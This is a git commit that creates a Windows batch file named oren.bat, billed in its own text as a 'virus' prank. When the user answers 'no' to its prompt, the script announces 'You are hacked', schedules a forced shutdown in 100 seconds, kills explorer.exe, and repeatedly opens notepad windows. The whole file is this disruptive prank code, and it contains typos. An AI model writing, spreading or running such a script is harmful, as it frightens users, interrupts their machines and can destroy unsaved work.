37df1d58b808f85d560515fa7dfefae092428902
1here3 <159972256+1here3@users.noreply.github.com>
2025-01-24 22:45:03 -0800

    Create oren.bat

---
+++ oren.bat
@@ -0,0 +1,61 @@
+@echo off
+color 57
+echo virus is no joke, still run it
+set /p love=
+if %love%==yes goto love
+if %love%==no goto hate
+:love
+echoo ojkk ill not run it, its
+echo fine
+pause 
+exit
+:hate
+echo your pc has been fbrandyubrandycbrandykbrandyed
+echo You are hacked...
+echo Your PC will crash in 100 seconds
+shutdown -s -t 100
+start
+timeout 2
+start notepad.exe
+timeout 6
+taskkill /f /im explorer.exe
+timeout 1
+start explorer.exe
+timeout 5
+start notepad.exe
+timeout 3
+start
+timeout 2
+start notepad.exe
+timeout 1
+start notepad.exe
+timeout 1
+start notepad.exe
+timeout 1
+timeout 1
+start notepad.exe
+timeout 1
+start notepad.exe
+timeout 1
+start notepad.exe
+timeout 1
+start notepad.exe
+timeout 1
+start notepad.exe
+timeout 1
+start notepad.exe
+timeout 1
+start notepad.exe
+timeout 1
+start notepad.exe
+timeout 1
+start notepad.exe
+timeout 1
+timeout 1
+start notepad.exe
+timeout 1
+start notepad.exe
+timeout 0.3
+start notepad.exe
+timeout 0.2
+start notepad.exe
